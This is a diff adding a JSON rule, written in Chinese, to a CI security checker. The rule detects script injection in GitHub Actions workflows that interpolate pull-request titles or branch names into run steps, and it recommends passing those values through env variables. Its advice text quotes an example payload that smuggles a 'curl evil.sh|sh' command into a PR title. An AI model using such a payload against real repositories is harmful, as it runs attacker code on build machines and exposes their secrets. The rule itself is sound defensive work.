@@ -1,0 +1,17 @@
+{
+  "id": "CI-SCRIPT-INJECTION",
+  "title": "run 里直接插值外部可控输入（脚本注入）",
+  "severity": "high",
+  "source": "GitHub Security Lab《Script injections in GitHub Actions》—— 攻击者可通过 PR 标题/分支名注入 shell 命令",
+  "advice": "${{ github.event.pull_request.title }} 这类值由**外部贡献者可控**。直接插进 run 里，等于让陌生人往你的 shell 里写字（比如标题里放 `\"; curl evil.sh|sh; \"`）。改成先写进 env: 再引用 $VAR。",
+  "check": {
+    "type": "file-pattern",
+    "pattern": "run:[\\s\\S]{0,200}\\$\\{\\{\\s*github\\.(event\\.(pull_request|issue|comment|discussion)|head_ref)",
+    "flags": "gs",
+    "paths": [
+      ".github/workflows/*",
+      ".github/workflows/**"
+    ],
+    "wholeFile": true
+  }
+}
